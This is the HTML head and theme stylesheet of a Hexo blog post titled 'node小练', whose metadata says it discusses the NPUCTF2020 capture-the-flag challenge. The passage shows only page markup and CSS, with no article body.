<!DOCTYPE html>
<html lang="en">
    <head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/#5.8.0'>
  <meta name="generator" content="Hexo 6.3.0">
  <meta name="Volantis" content="5.8.0">
  <meta charset="utf-8">
  <!-- SEOÁõ∏ÂÖ≥ -->
  
  <link rel="canonical" href="http://example.com/2024/05/30/nodeÂ∞èÁªÉ/"/>
  <!-- Ê∏≤Êüì‰ºòÂåñ -->
    <meta http-equiv='x-dns-prefetch-control' content='on' />
      <link rel='dns-prefetch' href='https://unpkg.com'>
      <link rel="preconnect" href="https://unpkg.com" crossorigin>
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta http-equiv="Content-Security-Policy" content=" default-src 'self' https:; block-all-mixed-content; base-uri 'self' https:; form-action 'self' https:; worker-src 'self' https:; connect-src 'self' https: *; img-src 'self' data: https: *; media-src 'self' https: *; font-src 'self' data: https: *; frame-src 'self' https: *; manifest-src 'self' https: *; child-src https:; script-src 'self' https: 'unsafe-inline' *; style-src 'self' https: 'unsafe-inline' *; ">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
  <meta content="black-translucent" name="apple-mobile-web-app-status-bar-style">
  <meta content="telephone=no" name="format-detection">
  <!-- import head_begin begin -->
  <!-- import head_begin end -->
  <!-- Custom Files headBegin begin-->
  
  <!-- Custom Files headBegin end-->
  <!-- front-matter head_begin begin -->
  <!-- front-matter head_begin end -->
  <link rel="preload" href="/css/style.css" as="style">
  <link rel="preload" href="https://unpkg.com/volantis-static@0.0.1654736714924/media/fonts/VarelaRound/VarelaRound-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
<link rel="preload" href="https://unpkg.com/volantis-static@0.0.1654736714924/media/fonts/UbuntuMono/UbuntuMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <!-- feed -->
  <!-- È°µÈù¢ÂÖÉÊï∞ÊçÆ -->
  <title>nodeÂ∞èÁªÉ - JijoyÁöÑblog</title>
  <meta name="keywords" content="null">
  <meta desc name="description" content="JijoyÁöÑblog - Jijoy - JijoyÁöÑblog">
  
<meta property="og:type" content="article">
<meta property="og:title" content="nodeÂ∞èÁªÉ">
<meta property="og:url" content="http://example.com/2024/05/30/node%E5%B0%8F%E7%BB%83/index.html">
<meta property="og:site_name" content="JijoyÁöÑblog">
<meta property="og:description" content="[NPUCTF2020]È™åËØÅüêé&#x2F;sourceÁªôÂà∞Ê∫êÁ†Å 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879const express &#x3D; re">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
<meta property="article:published_time" content="2024-05-30T08:57:46.000Z">
<meta property="article:modified_time" content="2024-06-06T09:11:09.892Z">
<meta property="article:author" content="Jijoy">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
  <style>
    /* È¶ñÂ±èÊ†∑Âºè */
    #safearea {
  display: none;
}
:root {
  --color-site-body: #f4f4f4;
  --color-site-bg: #f4f4f4;
  --color-site-inner: #fff;
  --color-site-footer: #666;
  --color-card: #fff;
  --color-text: #444;
  --color-block: #f6f6f6;
  --color-inlinecode: #c74f00;
  --color-codeblock: #fff7ea;
  --color-h1: #3a3a3a;
  --color-h2: #3a3a3a;
  --color-h3: #333;
  --color-h4: #444;
  --color-h5: #555;
  --color-h6: #666;
  --color-p: #444;
  --color-list: #666;
  --color-list-hl: #30ad91;
  --color-meta: #888;
  --color-read-bkg: #e0d8c8;
  --color-read-post: #f8f1e2;
  --color-copyright-bkg: #f5f5f5;
}
* {
  box-sizing: border-box;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  outline: none;
  margin: 0;
  padding: 0;
}
*::-webkit-scrollbar {
  height: 4px;
  width: 4px;
}
*::-webkit-scrollbar-track-piece {
  background: transparent;
}
*::-webkit-scrollbar-thumb {
  background: #3dd9b6;
  cursor: pointer;
  border-radius: 2px;
  -webkit-border-radius: 2px;
}
*::-webkit-scrollbar-thumb:hover {
  background: #ff5722;
}
html {
  color: var(--color-text);
  width: 100%;
  height: 100%;
  font-family: UbuntuMono, "Varela Round", "PingFang SC", "Microsoft YaHei", Helvetica, Arial, Menlo, Monaco, monospace, sans-serif;
  font-size: 16px;
}
html >::-webkit-scrollbar {
  height: 4px;
  width: 4px;
}
html >::-webkit-scrollbar-track-piece {
  background: transparent;
}
html >::-webkit-scrollbar-thumb {
  background: #54b5a0 linear-gradient(45deg, rgba(255,255,255,0.4) 25%, transparent 25%, transparent 50%, rgba(255,255,255,0.4) 50%, rgba(255,255,255,0.4) 75%, transparent 75%, transparent);
  cursor: pointer;
  border-radius: 2px;
  -webkit-border-radius: 2px;
}
html >::-webkit-scrollbar-thumb:hover {
  background: #54b5a0 linear-gradient(45deg, rgba(255,255,255,0.4) 25%, transparent 25%, transparent 50%, rgba(255,255,255,0.4) 50%, rgba(255,255,255,0.4) 75%, transparent 75%, transparent);
}
body {
  background-color: var(--color-site-body);
  text-rendering: optimizelegibility;
  -webkit-tap-highlight-color: rgba(0,0,0,0);
  line-height: 1.6;
  -webkit-text-size-adjust: 100%;
  -ms-text-size-adjust: 100%;
}
body.modal-active {
  overflow: hidden;
}
@media screen and (max-width: 680px) {
  body.modal-active {
    position: fixed;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
  }
}
a {
  color: #2092ec;
  cursor: pointer;
  text-decoration: none;
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
a:hover {
  color: #ff5722;
}
a:active,
a:hover {
  outline: 0;
}
ul,
ol {
  padding-left: 0;
}
ul li,
ol li {
  list-style: none;
}
header {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
}
img {
  border: 0;
  background: none;
  max-width: 100%;
}
svg:not(:root) {
  overflow: hidden;
}
hr {
  -moz-box-sizing: content-box;
  box-sizing: content-box;
  -webkit-box-sizing: content-box;
  -moz-box-sizing: content-box;
  height: 0;
  border: 0;
  border-radius: 1px;
  -webkit-border-radius: 1px;
  border-bottom: 1px solid rgba(68,68,68,0.1);
}
button,
input {
  color: inherit;
  font: inherit;
  margin: 0;
}
button {
  overflow: visible;
  text-transform: none;
  -webkit-appearance: button;
  cursor: pointer;
}
@supports (backdrop-filter: blur(20px)) {
  .blur {
    background: rgba(255,255,255,0.9) !important;
    backdrop-filter: saturate(200%) blur(20px);
  }
}
.shadow {
  box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1);
}
.shadow.floatable {
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
.shadow.floatable:hover {
  box-shadow: 0 2px 4px 0px rgba(0,0,0,0.1), 0 4px 8px 0px rgba(0,0,0,0.1), 0 8px 16px 0px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 2px 4px 0px rgba(0,0,0,0.1), 0 4px 8px 0px rgba(0,0,0,0.1), 0 8px 16px 0px rgba(0,0,0,0.1);
}
#l_cover {
  min-height: 64px;
}
.cover-wrapper {
  top: 0;
  left: 0;
  max-width: 100%;
  height: 100vh;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  flex-wrap: nowrap;
  -webkit-flex-wrap: nowrap;
  -khtml-flex-wrap: nowrap;
  -moz-flex-wrap: nowrap;
  -o-flex-wrap: nowrap;
  -ms-flex-wrap: nowrap;
  -webkit-box-direction: normal;
  -moz-box-direction: normal;
  -webkit-box-orient: vertical;
  -moz-box-orient: vertical;
  -webkit-flex-direction: column;
  -ms-flex-direction: column;
  flex-direction: column;
  align-items: center;
  align-self: center;
  align-content: center;
  color: var(--color-site-inner);
  padding: 0 16px;
  user-select: none;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  position: relative;
  overflow: hidden;
  margin-bottom: -100px;
}
.cover-wrapper .cover-bg {
  position: absolute;
  width: 100%;
  height: 100%;
  background-position: center;
  background-size: cover;
  -webkit-background-size: cover;
  -moz-background-size: cover;
}
.cover-wrapper .cover-bg.lazyload:not(.loaded) {
  opacity: 0;
  -webkit-opacity: 0;
  -moz-opacity: 0;
}
.cover-wrapper .cover-bg.lazyload.loaded {
  animation-delay: 0s;
  animation-duration: 0.5s;
  animation-fill-mode: forwards;
  animation-timing-function: ease-out;
  animation-name: fadeIn;
}
@-moz-keyframes fadeIn {
  0% {
    opacity: 0;
    -webkit-opacity: 0;
    -moz-opacity: 0;
    filter: blur(12px);
    transform: scale(1.02);
    -webkit-transform: scale(1.02);
    -khtml-transform: scale(1.02);
    -moz-transform: scale(1.02);
    -o-transform: scale(1.02);
    -ms-transform: scale(1.02);
  }
  100% {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@-webkit-keyframes fadeIn {
  0% {
    opacity: 0;
    -webkit-opacity: 0;
    -moz-opacity: 0;
    filter: blur(12px);
    transform: scale(1.02);
    -webkit-transform: scale(1.02);
    -khtml-transform: scale(1.02);
    -moz-transform: scale(1.02);
    -o-transform: scale(1.02);
    -ms-transform: scale(1.02);
  }
  100% {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@-o-keyframes fadeIn {
  0% {
    opacity: 0;
    -webkit-opacity: 0;
    -moz-opacity: 0;
    filter: blur(12px);
    transform: scale(1.02);
    -webkit-transform: scale(1.02);
    -khtml-transform: scale(1.02);
    -moz-transform: scale(1.02);
    -o-transform: scale(1.02);
    -ms-transform: scale(1.02);
  }
  100% {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@keyframes fadeIn {
  0% {
    opacity: 0;
    -webkit-opacity: 0;
    -moz-opacity: 0;
    filter: blur(12px);
    transform: scale(1.02);
    -webkit-transform: scale(1.02);
    -khtml-transform: scale(1.02);
    -moz-transform: scale(1.02);
    -o-transform: scale(1.02);
    -ms-transform: scale(1.02);
  }
  100% {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
.cover-wrapper .cover-body {
  z-index: 1;
  position: relative;
  width: 100%;
  height: 100%;
}
.cover-wrapper#full {
  height: calc(100vh + 100px);
  padding-bottom: 100px;
}
.cover-wrapper#half {
  max-height: 640px;
  min-height: 400px;
  height: calc(36vh - 64px + 200px);
}
.cover-wrapper #scroll-down {
  width: 100%;
  height: 64px;
  position: absolute;
  bottom: 100px;
  text-align: center;
  cursor: pointer;
}
.cover-wrapper #scroll-down .scroll-down-effects {
  color: #fff;
  font-size: 24px;
  line-height: 64px;
  position: absolute;
  width: 24px;
  left: calc(50% - 12px);
  text-shadow: 0 1px 2px rgba(0,0,0,0.1);
  animation: scroll-down-effect 1.5s infinite;
  -webkit-animation: scroll-down-effect 1.5s infinite;
  -khtml-animation: scroll-down-effect 1.5s infinite;
  -moz-animation: scroll-down-effect 1.5s infinite;
  -o-animation: scroll-down-effect 1.5s infinite;
  -ms-animation: scroll-down-effect 1.5s infinite;
}
@-moz-keyframes scroll-down-effect {
  0% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
  50% {
    top: -16px;
    opacity: 0.4;
    -webkit-opacity: 0.4;
    -moz-opacity: 0.4;
  }
  100% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@-webkit-keyframes scroll-down-effect {
  0% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
  50% {
    top: -16px;
    opacity: 0.4;
    -webkit-opacity: 0.4;
    -moz-opacity: 0.4;
  }
  100% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@-o-keyframes scroll-down-effect {
  0% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
  50% {
    top: -16px;
    opacity: 0.4;
    -webkit-opacity: 0.4;
    -moz-opacity: 0.4;
  }
  100% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@keyframes scroll-down-effect {
  0% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
  50% {
    top: -16px;
    opacity: 0.4;
    -webkit-opacity: 0.4;
    -moz-opacity: 0.4;
  }
  100% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
.cover-wrapper .cover-body {
  margin-top: 64px;
  margin-bottom: 100px;
}
.cover-wrapper .cover-body,
.cover-wrapper .cover-body .top,
.cover-wrapper .cover-body .bottom {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  -webkit-box-direction: normal;
  -moz-box-direction: normal;
  -webkit-box-orient: vertical;
  -moz-box-orient: vertical;
  -webkit-flex-direction: column;
  -ms-flex-direction: column;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  -webkit-justify-content: center;
  -khtml-justify-content: center;
  -moz-justify-content: center;
  -o-justify-content: center;
  -ms-justify-content: center;
  max-width: 100%;
}
.cover-wrapper .cover-body .bottom {
  margin-top: 32px;
}
.cover-wrapper .cover-body .title {
  font-family: "Varela Round", "PingFang SC", "Microsoft YaHei", Helvetica, Arial, Helvetica, monospace;
  font-size: 3.125rem;
  line-height: 1.2;
  text-shadow: 0 1px 2px rgba(0,0,0,0.1);
}
.cover-wrapper .cover-body .subtitle {
  font-size: 20px;
}
.cover-wrapper .cover-body .logo {
  max-height: 120px;
  max-width: calc(100% - 4 * 16px);
}
@media screen and (min-height: 1024px) {
  .cover-wrapper .cover-body .title {
    font-size: 3rem;
  }
  .cover-wrapper .cover-body .subtitle {
    font-size: 1.05rem;
  }
  .cover-wrapper .cover-body .logo {
    max-height: 150px;
  }
}
.cover-wrapper .cover-body .m_search {
  position: relative;
  max-width: calc(100% - 16px);
  width: 320px;
  vertical-align: middle;
}
.cover-wrapper .cover-body .m_search .form {
  position: relative;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  width: 100%;
}
.cover-wrapper .cover-body .m_search .icon,
.cover-wrapper .cover-body .m_search .input {
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
.cover-wrapper .cover-body .m_search .icon {
  position: absolute;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  line-height: 2.5rem;
  width: 32px;
  top: 0;
  left: 5px;
  color: rgba(68,68,68,0.75);
}
.cover-wrapper .cover-body .m_search .input {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  height: 2.5rem;
  width: 100%;
  box-shadow: none;
  -webkit-box-shadow: none;
  box-sizing: border-box;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  font-size: 0.875rem;
  -webkit-appearance: none;
  padding-left: 36px;
  border-radius: 1.4rem;
  -webkit-border-radius: 1.4rem;
  background: rgba(255,255,255,0.6);
  backdrop-filter: blur(10px);
  border: none;
  color: var(--color-text);
}
@media screen and (max-width: 500px) {
  .cover-wrapper .cover-body .m_search .input {
    padding-left: 36px;
  }
}
.cover-wrapper .cover-body .m_search .input:hover {
  background: rgba(255,255,255,0.8);
}
.cover-wrapper .cover-body .m_search .input:focus {
  background: #fff;
}
.cover-wrapper .list-h {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  -webkit-box-direction: normal;
  -moz-box-direction: normal;
  -webkit-box-orient: horizontal;
  -moz-box-orient: horizontal;
  -webkit-flex-direction: row;
  -ms-flex-direction: row;
  flex-direction: row;
  flex-wrap: wrap;
  -webkit-flex-wrap: wrap;
  -khtml-flex-wrap: wrap;
  -moz-flex-wrap: wrap;
  -o-flex-wrap: wrap;
  -ms-flex-wrap: wrap;
  align-items: stretch;
  border-radius: 4px;
  -webkit-border-radius: 4px;
  user-select: none;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
}
.cover-wrapper .list-h a {
  -webkit-box-flex: 1;
  -moz-box-flex: 1;
  -webkit-flex: 1 0;
  -ms-flex: 1 0;
  flex: 1 0;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  font-weight: 600;
}
.cover-wrapper .list-h a img {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  border-radius: 2px;
  -webkit-border-radius: 2px;
  margin: 4px;
  min-width: 40px;
  max-width: 44px;
}
@media screen and (max-width: 768px) {
  .cover-wrapper .list-h a img {
    min-width: 36px;
    max-width: 40px;
  }
}
@media screen and (max-width: 500px) {
  .cover-wrapper .list-h a img {
    margin: 2px 4px;
    min-width: 32px;
    max-width: 36px;
  }
}
@media screen and (max-width: 375px) {
  .cover-wrapper .list-h a img {
    min-width: 28px;
    max-width: 32px;
  }
}
.cover-wrapper {
  max-width: 100%;
}
.cover-wrapper.search .bottom .menu {
  margin-top: 16px;
}
.cover-wrapper.search .bottom .menu .list-h a {
  white-space: nowrap;
  -webkit-box-direction: normal;
  -moz-box-direction: normal;
  -webkit-box-orient: horizontal;
  -moz-box-orient: horizontal;
  -webkit-flex-direction: row;
  -ms-flex-direction: row;
  flex-direction: row;
  align-items: baseline;
  padding: 2px;
  margin: 4px;
  color: var(--color-site-inner);
  opacity: 0.75;
  -webkit-opacity: 0.75;
  -moz-opacity: 0.75;
  text-shadow: 0 1px 2px rgba(0,0,0,0.05);
  border-bottom: 2px solid transparent;
}
.cover-wrapper.search .bottom .menu .list-h a i {
  margin-right: 4px;
}
.cover-wrapper.search .bottom .menu .list-h a p {
  font-size: 0.9375rem;
}
.cover-wrapper.search .bottom .menu .list-h a:hover,
.cover-wrapper.search .bottom .menu .list-h a.active,
.cover-wrapper.search .bottom .menu .list-h a:active {
  opacity: 1;
  -webkit-opacity: 1;
  -moz-opacity: 1;
  border-bottom: 2px solid var(--color-site-inner);
}
@font-face {
  font-family: 'UbuntuMono';
  src: url("https://unpkg.com/volantis-static@0.0.1654736714924/media/fonts/UbuntuMono/UbuntuMono-Regular.ttf");
  font-weight: 'normal';
  font-style: 'normal';
  font-display: swap;
}
@font-face {
  font-family: 'Varela Round';
  src: url("https://unpkg.com/volantis-static@0.0.1654736714924/media/fonts/VarelaRound/VarelaRound-Regular.ttf");
  font-weight: 'normal';
  font-style: 'normal';
  font-display: swap;
}
.l_header {
  position: fixed;
  z-index: 1000;
  top: 0;
  width: 100%;
  height: 64px;
  background: var(--color-card);
  box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1);
}
.l_header.auto {
  transition: opacity 0.4s ease;
  -webkit-transition: opacity 0.4s ease;
  -khtml-transition: opacity 0.4s ease;
  -moz-transition: opacity 0.4s ease;
  -o-transition: opacity 0.4s ease;
  -ms-transition: opacity 0.4s ease;
  visibility: hidden;
}
.l_header.auto.show {
  opacity: 1 !important;
  -webkit-opacity: 1 !important;
  -moz-opacity: 1 !important;
  visibility: visible;
}
.l_header .container {
  margin-left: 16px;
  margin-right: 16px;
}
.l_header #wrapper {
  height: 100%;
  user-select: none;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
}
.l_header #wrapper .nav-main,
.l_header #wrapper .nav-sub {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  flex-wrap: nowrap;
  -webkit-flex-wrap: nowrap;
  -khtml-flex-wrap: nowrap;
  -moz-flex-wrap: nowrap;
  -o-flex-wrap: nowrap;
  -ms-flex-wrap: nowrap;
  justify-content: space-between;
  -webkit-justify-content: space-between;
  -khtml-justify-content: space-between;
  -moz-justify-content: space-between;
  -o-justify-content: space-between;
  -ms-justify-content: space-between;
  align-items: center;
}
.l_header #wrapper .nav-main {
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
.l_header #wrapper.sub .nav-main {
  transform: translateY(-64px);
  -webkit-transform: translateY(-64px);
  -khtml-transform: translateY(-64px);
  -moz-transform: translateY(-64px);
  -o-transform: translateY(-64px);
  -ms-transform: translateY(-64px);
}
.l_header #wrapper .nav-sub {
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
  opacity: 0;
  -webkit-opacity: 0;
  -moz-opacity: 0;
  height: 64px;
  width: calc(100% - 2 * 16px);
  position: absolute;
}
.l_header #wrapper .nav-sub ::-webkit-scrollbar {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
}
@media screen and (min-width: 2048px) {
  .l_header #wrapper .nav-sub {
    max-width: 55vw;
    margin: auto;
  }
}
.l_header #wrapper.sub .nav-sub {
  opacity: 1;
  -webkit-opacity: 1;
  -moz-opacity: 1;
}
.l_header #wrapper .title {
  position: relative;
  color: var(--color-text);
  padding-left: 24px;
  max-height: 64px;
}
.l_header #wrapper .nav-main .title {
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
  flex-shrink: 0;
  line-height: 64px;
  padding: 0 24px;
  font-size: 1.25rem;
  font-family: "Varela Round", "PingFang SC", "Microsoft YaHei", Helvetica, Arial, Helvetica, monospace;
}
.l_header #wrapper .nav-main .title img {
  height: 64px;
}
.l_header .nav-sub {
  max-width: 1080px;
  margin: auto;
}
.l_header .nav-sub .title {
  font-weight: bold;
  font-family: UbuntuMono, "Varela Round", "PingFang SC", "Microsoft YaHei", Helvetica, Arial, Menlo, Monaco, monospace, sans-serif;
  line-height: 1.2;
  max-height: 64px;
  white-space: normal;
  flex-shrink: 1;
}
.l_header .switcher {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
  line-height: 64px;
  align-items: center;
}
.l_header .switcher .s-toc {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
}
@media screen and (max-width: 768px) {
  .l_header .switcher .s-toc {
    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
    display: -ms-flexbox /* TWEENER - IE 10 */;
    display: -webkit-flex /* NEW - Chrome */;
    display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
    display: flex;
  }
}
.l_header .switcher >li {
  height: 48px;
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
  margin: 2px;
}
@media screen and (max-width: 500px) {
  .l_header .switcher >li {
    margin: 0 1px;
    height: 48px;
  }
}
.l_header .switcher >li >a {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  justify-content: center;
  -webkit-justify-content: center;
  -khtml-justify-content: center;
  -moz-justify-content: center;
  -o-justify-content: center;
  -ms-justify-content: center;
  align-items: center;
  width: 48px;
  height: 48px;
  padding: 0.85em 1.1em;
  border-radius: 100px;
  -webkit-border-radius: 100px;
  border: none;
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
  color: #3dd9b6;
}
.l_header .switcher >li >a:hover {
  border: none;
}
.l_header .switcher >li >a.active,
.l_header .switcher >li >a:active {
  border: none;
  background: var(--color-site-bg);
}
@media screen and (max-width: 500px) {
  .l_header .switcher >li >a {
    width: 36px;
    height: 48px;
  }
}
.l_header .nav-sub .switcher {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
}
.l_header .m_search {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  height: 64px;
  width: 240px;
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
@media screen and (max-width: 1024px) {
  .l_header .m_search {
    width: 44px;
    min-width: 44px;
  }
  .l_header .m_search input::placeholder {
    opacity: 0;
    -webkit-opacity: 0;
    -moz-opacity: 0;
  }
  .l_header .m_search:hover {
    width: 240px;
  }
  .l_header .m_search:hover input::placeholder {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@media screen and (min-width: 500px) {
  .l_header .m_search:hover .input {
    width: 100%;
  }
  .l_header .m_search:hover .input::placeholder {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@media screen and (max-width: 500px) {
  .l_header .m_search {
    min-width: 0;
  }
  .l_header .m_search input::placeholder {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
.l_header .m_search .form {
  position: relative;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  width: 100%;
  align-items: center;
}
.l_header .m_search .icon {
  position: absolute;
  width: 36px;
  left: 5px;
  color: var(--color-meta);
}
@media screen and (max-width: 500px) {
  .l_header .m_search .icon {
    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
    display: none;
  }
}
.l_header .m_search .input {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  padding-top: 8px;
  padding-bottom: 8px;
  line-height: 1.3;
  width: 100%;
  color: var(--color-text);
  background: #fafafa;
  box-shadow: none;
  -webkit-box-shadow: none;
  box-sizing: border-box;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  padding-left: 40px;
  font-size: 0.875rem;
  border-radius: 8px;
  -webkit-border-radius: 8px;
  border: none;
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
@media screen and (min-width: 500px) {
  .l_header .m_search .input:focus {
